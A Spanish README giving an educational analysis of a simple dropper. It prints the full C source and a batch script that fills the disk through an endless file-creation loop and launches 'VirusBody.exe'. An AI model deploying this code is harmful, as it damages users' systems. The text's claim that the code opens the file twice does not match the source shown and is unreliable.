# Análisis Educativo de Malware: Dropper Básico

## 🎯 Descripción General

Este repositorio contiene un **análisis técnico educativo** de un malware tipo **Dropper** que genera un ataque de denegación de servicio (DoS) local mediante agotamiento de recursos. Es material exclusivamente para fines de **seguridad ofensiva autorizada** y educación en ciberseguridad.

---

## 1️⃣ Creación del "Payload" (Archivo Batch)

El código utiliza `fopen(PATH, "w")` para crear (o sobrescribir) un archivo llamado `Virus.bat`. Luego, usa `fprintf` para escribir el siguiente script malicioso dentro de él:

```batch
@echo off
:start
echo rekt > getrecknerd\%random%.txt
goto start
```

### ¿Qué hace este script?

- **Bucle infinito** (`:start ... goto start`) que intenta crear archivos de texto sin parar
- Genera nombres aleatorios usando `%random%`
- Se almacenan en una carpeta específica (`getrecknerd\`)
- **Ataque de agotamiento de recursos**: Llena el disco duro o colapsa el explorador de archivos

---

## 2️⃣ Ejecución del Cuerpo del Malware

```c
system("VirusBody.exe");
```

Esta línea intenta ejecutar un archivo llamado `VirusBody.exe`. En el contexto de un ataque, este suele ser el **payload principal** (troyano, ransomware, keylogger, etc.) que el programador espera que ya esté en la misma carpeta.

---

## 🔍 Análisis de Pentesting

Si estuvieras documentando esto en un reporte de seguridad, podrías clasificarlo así:

| Aspecto | Detalle |
|--------|---------|
| **Categoría** | Malware simple / Script Kiddie level |
| **Vector** | Creación de archivos en tiempo de ejecución (Dropping) |
| **Tipo de Ataque** | DoS local por agotamiento de recursos |
| **Debilidad Principal** | Muy ruidoso y detectable por antivirus modernos |
| **Detección** | Windows Defender detectaría instantáneamente la creación del `.bat` o ejecución de comandos sospechosos |

---

## 3️⃣ Código Fuente Completo

### Virus_Dropper.c

```c
#include <stdio.h>
#define PATH "Virus.bat"

int main() {
    FILE *fp;
    
    // Creación del payload malicioso
    fp = fopen(PATH, "w");
    fprintf(fp, "@echo off\n:start\necho rekt > getrecknerd\\%%random%%.txt\ngoto start");
    fclose(fp);
    
    // Intento de ejecución del componente principal
    system("VirusBody.exe");
    
    return 0;
}
```

---

## ⚠️ Notas de Seguridad Críticas

- El código contiene **errores** (como abrir el archivo dos veces con punteros distintos), lo que demuestra que es código experimental
- **NO lo compiles ni lo ejecutes** en tu máquina física
- El bucle infinito del `.bat` puede **congelar tu sistema** irreversiblemente
- Este contenido es **exclusivamente para fines educativos** y de seguridad ofensiva **autorizada**
- **El acceso a sistemas sin permiso es ilegal** ⚖️

---

## 📚 Propósito Educativo

Este análisis sir
